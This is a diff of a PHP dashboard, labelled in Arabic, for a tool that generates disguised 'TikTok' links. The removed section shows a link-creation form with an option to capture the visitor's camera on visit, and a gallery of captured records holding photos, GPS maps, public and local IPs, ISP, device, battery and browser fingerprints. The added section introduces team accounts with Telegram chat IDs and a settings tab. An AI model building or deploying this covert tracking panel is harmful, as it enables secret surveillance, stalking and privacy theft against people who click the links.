+                                    <button type="button" class="btn" onclick="copyText('<?php echo htmlspecialchars(addslashes($generated_code)); ?>', this)">نسخ</button>
+                                </div>
+                            </div>
+                        </div>
+                    <?php endif; ?>
+                </div>
+            </div>
+
+            <!-- 3. إدارة الفريق -->
+            <?php if ($is_admin): ?>
+            <div id="tab-team" class="tab-content">
+                <div class="card">
+                    <div class="card-title">➕ إضافة زميل جديد</div>
+                    <form method="POST" style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px;">
+                        <div class="form-group"><input type="text" name="new_username" placeholder="اسم المستخدم" required></div>
+                        <div class="form-group"><input type="password" name="new_password" placeholder="كلمة المرور" required></div>
+                        <div class="form-group"><input type="text" name="new_tg_chat" placeholder="Chat ID التلجرام (اختياري)"></div>
+                        <div class="form-group"><button type="submit" name="add_user" class="btn btn-success" style="width: 100%;">إضافة</button></div>
+                    </form>
+                </div>
+
+                <div class="card">
+                    <div class="card-title">👥 قائمة الزملاء</div>
+                    <?php if (isset($user_error)): ?><p style="color: var(--danger); font-size: 13px; margin-bottom: 15px;"><?php echo $user_error; ?></p><?php endif; ?>
+                    <div class="table-responsive">
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>المستخدم</th>
+                                    <th>معرف التلجرام</th>
+                                    <th>تاريخ الإضافة</th>
+                                    <th>الإجراءات</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <?php foreach ($users_list as $u): ?>
+                                <tr>
+                                    <td style="font-weight: bold; color: var(--accent);"><?php echo htmlspecialchars($u['username']); ?></td>
+                                    <td><?php echo htmlspecialchars($u['tg_chat'] ?: '-'); ?></td>
+                                    <td style="color: var(--muted);"><?php echo $u['created_at']; ?></td>
+                                    <td>
+                                        <div style="display: flex; gap: 10px;">
+                                            <form method="POST" style="display:inline;">
+                                                <input type="hidden" name="target_user_id" value="<?php echo $u['id']; ?>">
+                                                <input type="hidden" name="admin_new_password" id="new_pass_<?php echo $u['id']; ?>">
+                                                <button type="button" onclick="let p = prompt('كلمة المرور الجديدة لـ <?php echo htmlspecialchars($u['username']); ?>:'); if(p){document.getElementById('new_pass_<?php echo $u['id']; ?>').value = p; this.form.submit();}" class="btn" style="padding: 6px 12px; font-size: 12px; background: #4f46e5;">تغيير الكلمة</button>
+                                                <input type="hidden" name="admin_change_user_pass" value="1">
+                                            </form>
+                                            <a href="?delete_user=<?php echo $u['id']; ?>" class="btn btn-danger" style="padding: 6px 12px; font-size: 12px;" onclick="return confirm('حذف الزميل وكل روابطه؟');">حذف</a>
+                                        </div>
+                                    </td>
+                                </tr>
+                                <?php endforeach; ?>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
             </div>
             <?php endif; ?>
 
-            <!-- إنشاء رابط -->
-            <div class="section-box">
-                <h2>إنشاء رابط تيك توك</h2>
-                <form method="POST" class="form-grid">
-                    <input type="text" name="target_url" placeholder="TikTok Video URL..." required>
-                    <label class="checkbox-container"><input type="checkbox" name="use_camera" value="1" checked> تفعيل التقاط صورة الكاميرا عند الزيارة (اختياري)</label>
-                    <button type="submit" name="create" class="btn">توليد الرابط</button>
-                </form>
-                <?php if (!empty($generated_link)): ?>
-                    <div class="result-panel">
-                        <div><label>الرابط النشط:</label><div class="flex-row" style="margin-top: 6px;"><input type="text" class="input-link-result" readonly value="<?php echo htmlspecialchars($generated_link); ?>"><button type="button" class="btn btn-secondary" onclick="copyText('<?php echo htmlspecialchars(addslashes($generated_link)); ?>', this)">Copy</button></div></div>
-                        <div><label>كود التتبع:</label><div class="flex-row" style="margin-top: 6px;"><input type="text" class="input-link-result" readonly value="<?php echo htmlspecialchars($generated_code); ?>" style="font-family: monospace; font-weight: bold; color: #a78bfa !important;"><button type="button" class="btn btn-secondary" onclick="copyText('<?php echo htmlspecialchars(addslashes($generated_code)); ?>', this)">Copy Code</button></div></div>
-                    </div>
-                <?php endif; ?>
+            <!-- 4. الإعدادات (تغيير كلمة المرور) -->
+            <div id="tab-settings" class="tab-content">
+                <div class="card" style="max-width: 600px; margin: 0 auto;">
+                    <div class="card-title">🔐 تغيير كلمة المرور</div>
+                    <?php if (!empty($pass_error)): ?><p style="color: var(--danger); font-size: 13px; margin-bottom: 15px;"><?php echo $pass_error; ?></p><?php endif; ?>
+                    <?php if (!empty($pass_success)): ?><p style="color: var(--success); font-size: 13px; margin-bottom: 15px;"><?php echo $pass_success; ?></p><?php endif; ?>
+                    
+                    <form method="POST">
+                        <div class="form-group">
+                            <label>كلمة المرور الحالية</label>
+                            <input type="password" name="current_password" required>
+                        </div>
+                        <div class="form-group">
+                            <label>كلمة المرور الجديدة</label>
+                            <input type="password" name="new_password" required>
+                        </div>
+                        <div class="form-group">
+                            <label>تأكيد كلمة المرور الجديدة</label>
+                            <input type="password" name="confirm_password" required>
+                        </div>
+                        <button type="submit" name="change_my_password" class="btn" style="width: 100%;">حفظ التغييرات</button>
+                    </form>
+                </div>
             </div>
 
-            <!-- عرض السجلات -->
-            <div class="section-box">
-                <h2><span>سجلات الزيارات (<?php echo $is_admin ? 'الجميع' : 'روابطك فقط'; ?>)</span><a href="/" class="btn btn-secondary" style="height: 28px; padding: 0 12px; font-size: 11px;">🔄 Refresh</a></h2>
-                <form method="GET" style="margin-bottom: 20px; display: flex; gap: 8px; flex-wrap: wrap;">
-                    <input type="text" name="track" placeholder="البحث بكود التتبع..." value="<?php echo htmlspecialchars($filter_code); ?>" style="flex:1; min-width: 200px;">
-                    <div style="display: flex; gap: 8px;">
-                        <button type="submit" class="btn" style="height:48px;">بحث</button>
-                        <?php if(!empty($filter_code)): ?><a href="/" class="btn btn-danger" style="height:48px; display:flex; align-items:center;">إلغاء</a><?php endif; ?>
-                    </div>
-                </form>
-
-                <?php if (empty($captures)): ?>
-                    <p style="text-align: center; color: var(--muted); padding: 40px;">لا توجد سجلات حتى الآن.</p>
-                <?php else: ?>
-                    <div class="gallery-grid">
-                        <?php foreach ($captures as $cap): ?>
-                            <div class="card-img">
-                                <?php if (!empty($cap['image_data'])): ?>
-                                    <a href="<?php echo htmlspecialchars($cap['image_data']); ?>" target="_blank"><img src="<?php echo htmlspecialchars($cap['image_data']); ?>" alt="Capture"></a>
-                                <?php else: ?>
-                                    <div style="width: 100%; height: 180px; background: #0b1329; display: flex; align-items: center; justify-content: center; border-radius: 8px; color: var(--muted); font-size: 12px; border: 1px dashed var(--border);">الكاميرا معطلة (بدون صورة)</div>
-                                <?php endif; ?>
-
-                                <?php if (!empty($cap['latitude']) && !empty($cap['longitude'])): ?>
-                                    <div id="map-<?php echo $cap['id']; ?>" class="map-container"></div>
-                                    <script>
-                                        document.addEventListener("DOMContentLoaded", function() {
-                                            var map = L.map('map-<?php echo $cap['id']; ?>', { zoomControl: false, attributionControl: false }).setView([<?php echo $cap['latitude']; ?>, <?php echo $cap['longitude']; ?>], 10);
-                                            L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/Canvas/World_Dark_Gray_Base/MapServer/tile/{z}/{y}/{x}', { maxZoom: 16 }).addTo(map);
-                                            L.circleMarker([<?php echo $cap['latitude']; ?>, <?php echo $cap['longitude']; ?>], { color: '#8b5cf6', fillColor: '#8b5cf6', fillOpacity: 0.8, radius: 8 }).addTo(map).bindPopup("<b><?php echo htmlspecialchars($cap['public_ip']); ?></b>");
-                                        });
-                                    </script>
-                                <?php endif; ?>
-
-                                <div class="info-row" style="margin-top:10px;"><span>Code:</span> <span class="code-badge" onclick="copyText('<?php echo htmlspecialchars(addslashes($cap['code'])); ?>')"><?php echo htmlspecialchars($cap['code']); ?> 📋</span></div>
-                                <div class="info-row"><span>Public IP:</span> <span style="color:#38bdf8;"><?php echo htmlspecialchars($cap['public_ip']); ?></span></div>
-                                <div class="info-row"><span>Local IP:</span> <span><?php echo htmlspecialchars($cap['local_ip']); ?></span></div>
-                                <div class="info-row"><span>Location:</span> <span style="color:#10b981;"><?php echo htmlspecialchars($cap['location']); ?></span></div>
-                                <div class="info-row"><span>ISP:</span> <span style="color:#f97316; font-weight: bold;"><?php echo htmlspecialchars($cap['isp_info']); ?></span></div>
-                                
-                                <div class="info-row" style="background: rgba(139, 92, 246, 0.1); padding: 4px; border-radius: 4px; margin-top: 8px;"><span>Port:</span> <span style="color:#a78bfa;"><?php echo htmlspecialchars($cap['port']); ?></span></div>
-                                <div class="info-row"><span>Device:</span> <span style="color:#a78bfa;"><?php echo htmlspecialchars($cap['device_info']); ?></span></div>
-                                <div class="info-row"><span>Battery:</span> <span style="color:#a78bfa;"><?php echo htmlspecialchars($cap['battery_info']); ?></span></div>
-                                <div class="info-row"><span>Fingerprint:</span> <span style="color:#a78bfa; font-family: monospace;"><?php echo htmlspecialchars($cap['canvas_fp']); ?></span></div>
-
-                                <div class="info-row" style="border-top:1px solid var(--border); padding-top:6px; margin-top:8px;"><span>Time:</span> <span style="color:#a78bfa; font-weight:bold;"><?php echo htmlspecialchars($cap['created_at']); ?></span></div>
-                                <a href="?delete_id=<?php echo $cap['id']; ?>" class="btn-delete" onclick="return confirm('حذف السجل؟');">حذف السجل</a>
-                            </div>
-                        <?php endforeach; ?>
-                    </div>
-                <?php endif; ?>
-            </div>
-        <?php endif; ?>
+        </main>
     </div>
-    <div class="toast" id="toast">✅ تم النسخ بنجاح!</div>
-    <footer><p>Developed by <span style="color:var(--accent);">azeez</span> &copy; 2026</p></footer>
+
+<?php endif; ?>
+
+<div class="toast" id="toast">✅ تم النسخ بنجاح!</div>
+
+<script>
+    // التبديل بين التبويبات
+    function switchTab(tabId) {
+        // إخفاء كل المحتوى
+        document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active'));
+        // إزالة التفعيل عن الأزرار
+        document.querySelectorAll('.nav-item').forEach(btn => btn.classList.remove('active'));
+        
+        // إظهار المحتوى المطلوب
+        document.getElementById('tab-' + tabId).classList.add('active');
+        // تفعيل الزر
+        event.currentTarget.classList.add('active');
+    }
+
+    // نسخ النصوص
+    function copyText(text, btn) {
+        navigator.clipboard.writeText(text).then(() => {
+            const t = document.getElementById('toast');
+            t.classList.add('show');
+            setTimeout(() => t.classList.remove('show'), 2000);
+            if(btn) {
+                const o = btn.innerText; 
+                btn.innerText = "تم النسخ!"; 
+                setTimeout(() => { btn.innerText = o; }, 2000);
+            }
+        });
+    }
+
+    // فتح تبويب إنشاء الرابط تلقائياً إذا كان هناك رابط جديد
+    <?php if (!empty($generated_link)): ?>
+        document.addEventListener('DOMContentLoaded', () => {
+            // إخفاء الكل
+            document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active'));
+            document.querySelectorAll('.nav-item').forEach(btn => btn.classList.remove('active'));
+            // فتح التبويب
+            document.getElementById('tab-create').classList.add('active');
+            document.querySelectorAll('.nav-item')[1].classList.add('active');
+        });
+    <?php endif; ?>
+</script>
 </body>
 </html>
